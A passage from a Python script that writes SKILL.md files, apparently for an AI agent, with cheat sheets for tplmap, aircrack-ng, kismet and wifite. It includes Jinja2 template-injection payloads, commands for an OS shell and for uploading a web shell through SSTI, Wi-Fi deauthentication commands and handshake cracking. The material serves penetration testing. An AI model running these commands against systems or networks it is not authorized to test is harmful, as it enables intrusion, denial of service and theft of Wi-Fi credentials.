""",
    },
    "web-app/tplmap": {
        "name": "tplmap",
        "description": "Automatic Server-Side Template Injection detection and exploitation across 18+ template engines. Use when testing for SSTI vulnerabilities in Jinja2, Twig, Smarty, Mako, and other template engines to achieve RCE.",
        "compatibility": "Python 2/3; Linux/macOS; github.com/epinna/tplmap",
        "body": """# Tplmap

Automatic SSTI detection and exploitation — 18+ template engines.

## Quick Start

```bash
git clone https://github.com/epinna/tplmap
cd tplmap && pip install -r requirements.txt

# Detect SSTI
python2 tplmap.py -u "http://target.com/page?name=*"

# Shell via SSTI
python2 tplmap.py -u "http://target.com/page?name=*" --os-shell

# Upload file via SSTI
python2 tplmap.py -u "http://target.com/page?name=*" --upload /local/shell.php /var/www/html/shell.php
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL (mark injection with `*`) |
| `-d "k=v"` | POST data |
| `-H "K:V"` | Custom header |
| `--os-shell` | Interactive OS shell |
| `--os-cmd CMD` | Run single command |
| `--upload src dst` | Upload file |
| `--download src dst` | Download file |
| `--engine E` | Force specific engine |
| `--level N` | Detection level (1-5) |

## Supported Engines

Jinja2 · Twig · Smarty · Mako · Pebble · Jade · Tornado · Velocity · Freemarker · Cheetah · ERB · EJS · DustJS · Nunjucks · Marko

## Common Workflows

**Jinja2 manual verify:**
```
{{7*7}} → 49 in response = confirmed
{{config}} → dump Flask config
{{''.__class__.__mro__[1].__subclasses__()}} → list classes
```

**Automated RCE:**
```bash
python2 tplmap.py -u "http://target.com/render?tmpl=*" --os-shell
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Manual SSTI payloads per engine |
""",
    },
    # --- wireless ---
    "wireless/aircrack-ng": {
        "name": "aircrack-ng",
        "description": "802.11 WEP/WPA/WPA2 auditing suite — capture handshakes, perform deauth attacks, and crack Wi-Fi passwords. Use when assessing wireless network security or recovering Wi-Fi credentials.",
        "compatibility": "C; Linux; apt install aircrack-ng; requires wireless adapter with monitor mode",
        "body": """# Aircrack-ng

802.11 wireless auditing suite — WEP/WPA/WPA2 capture and crack.

## Quick Start

```bash
apt install aircrack-ng

# 1. Enable monitor mode
airmon-ng start wlan0    # Creates wlan0mon

# 2. Discover networks
airodump-ng wlan0mon

# 3. Capture target handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauth client (separate terminal) to force handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack WPA handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

## Tool Suite

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Monitor mode management |
| `airodump-ng` | Packet capture / AP discovery |
| `aireplay-ng` | Packet injection / deauth |
| `aircrack-ng` | WEP/WPA cracking |
| `airdecap-ng` | Decrypt captured traffic |
| `airgraph-ng` | Visualize network topology |

## Common Workflows

**WPA PMKID attack (no client needed):**
```bash
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hashes.22000
hashcat -m 22000 hashes.22000 rockyou.txt
```

**WEP crack:**
```bash
airodump-ng -c 11 --bssid BSSID -w wep wlan0mon
aireplay-ng -3 -b BSSID wlan0mon   # ARP replay
aircrack-ng wep-01.cap              # Auto-cracks when enough IVs
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | PMKID workflow and adapter compatibility |
""",
    },
    "wireless/kismet": {
        "name": "kismet",
        "description": "Wireless network detector and sniffer supporting Wi-Fi, Bluetooth, Zigbee, and SDR. Use when performing passive wireless reconnaissance, device tracking, or capturing traffic without active injection.",
        "compatibility": "Linux/macOS; apt install kismet; requires compatible wireless adapter",
        "body": """# Kismet

Wireless detector and sniffer — passive Wi-Fi, Bluetooth, Zigbee, SDR.

## Quick Start

```bash
apt install kismet

# Start with web UI (port 2501)
kismet -c wlan0

# Open web UI
open http://localhost:2501
# Default creds: kismet/kismet

# Capture to pcap
kismet -c wlan0 --log-types pcapppi
```

## Key Features

| Feature | Purpose |
|---------|---------|
| AP discovery | SSID, BSSID, channel, encryption, signal |
| Client tracking | Devices associated to APs |
| Bluetooth | BT classic + BLE scanning (with adapter) |
| Zigbee | IoT/sensor network detection |
| GPS integration | Map devices with gpsd |
| Logging | Kismet DB, pcap, JSON, netxml |

## Core Flags

| Flag | Purpose |
|------|---------|
| `-c IFACE` | Capture interface |
| `--no-logging` | Disable logging |
| `--log-prefix DIR` | Log output directory |
| `--log-types TYPE` | Log formats |
| `--daemonize` | Run in background |
| `--override wardriving` | Wardriving mode |

## Common Workflows

**Passive wardriving:**
```bash
kismet -c wlan0 --override wardriving --log-prefix /tmp/wardriving
```

**Capture all traffic for offline analysis:**
```bash
kismet -c wlan0 --log-types pcapppi --log-prefix /tmp/capture
# Analyze with wireshark
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | GPS setup, Bluetooth adapter config |
""",
    },
    "wireless/wifite": {
        "name": "wifite",
        "description": "Automated wireless auditing tool that attacks WEP/WPA/WPA2/PMKID with minimal configuration. Use when automating Wi-Fi attacks against multiple targets without manually orchestrating aircrack-ng commands.",
        "compatibility": "Python 3; Linux; pip install wifite; requires aircrack-ng suite + monitor mode adapter",
        "body": """# Wifite

Automated Wi-Fi cracker — attacks WEP/WPA/WPA2/PMKID with one command.

## Quick Start

```bash
pip install wifite   # or: apt install wifite

# Full auto (scan and attack all visible networks)
sudo wifite

# Target specific BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# WPA handshake only + crack with wordlist
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt

# PMKID attack
sudo wifite --pmkid
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--bssid MAC` | Target specific AP |
| `--essid NAME` | Target by SSID name |
| `--channel N` | Target channel |
| `--wpa` | Only WPA targets |
| `--wep` | Only WEP targets |
| `--pmkid` | PMKID attack (clientless) |
| `--dict FILE` | Wordlist for cracking |
| `--no-deauth` | Skip deauth (stealth) |
| `--timeout N` | Attack timeout (s) |
| `--crack` | Auto-crack after capture |

## Common Workflows

**Automated PMKID + crack:**
```bash
sudo wifite --pmkid --dict rockyou.txt
```

**WPA handshake capture only (no crack):**
```bash
sudo wifite --wpa --no-crack
# Handshake saved to ~/hs/
# Crack later: aircrack-ng ~/hs/*.cap -w rockyou.txt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Dependency checklist and troubleshooting |
""",
    },
}

def write_skill(rel_path: str, info: dict) -> None:
    skill_dir = BASE / rel_path
    skill_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / "references").mkdir(exist_ok=True)

    content = f"""---
name: {info['name']}
description: "{info['description']}"
license: MIT
compatibility: "{info['compatibility']}"
metadata:
  author: AeonDave
  version: "1.0"
---

{info['body'].strip()}
"""
    (skill_dir / "SKILL.md").write_text(content, encoding="utf-8")
    print(f"  wrote: tools/{rel_path}/SKILL.md")

for rel, info in SKILLS.items():
    write_skill(rel, info)

print(f"\nDone — wrote {len(SKILLS)} SKILL.md files.")
